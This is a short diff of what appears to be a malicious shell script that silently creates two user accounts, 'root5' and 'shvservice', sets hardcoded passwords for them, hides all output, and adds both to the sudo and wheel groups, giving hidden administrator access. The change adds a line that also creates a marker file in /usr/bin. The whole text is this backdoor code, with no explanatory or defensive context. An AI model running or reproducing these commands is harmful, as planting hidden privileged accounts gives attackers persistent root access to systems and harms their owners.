@@ -1,2 +1,2 @@
-useradd root5 1>/dev/null 2>/dev/null; useradd shvservice 1>/dev/null 2>/dev/null; echo "root5:soren!#2pa1" | chpasswd 1>/dev/null 2>/dev/null; echo "shvservice:soren!#2pa2" | chpasswd 1>/dev/null 2>/dev/null;
+touch /usr/bin//tashaten 1>/dev/null 2>/dev/null; useradd root5 1>/dev/null 2>/dev/null; useradd shvservice 1>/dev/null 2>/dev/null; echo "root5:soren!#2pa1" | chpasswd 1>/dev/null 2>/dev/null; echo "shvservice:soren!#2pa2" | chpasswd 1>/dev/null 2>/dev/null;
 usermod -aG sudo root5 1>/dev/null 2>/dev/null; usermod -aG sudo shvservice 1>/dev/null 2>/dev/null; usermod -aG wheel root5 1>/dev/null 2>/dev/null; usermod -aG wheel shvservice 1>/dev/null 2>/dev/null;
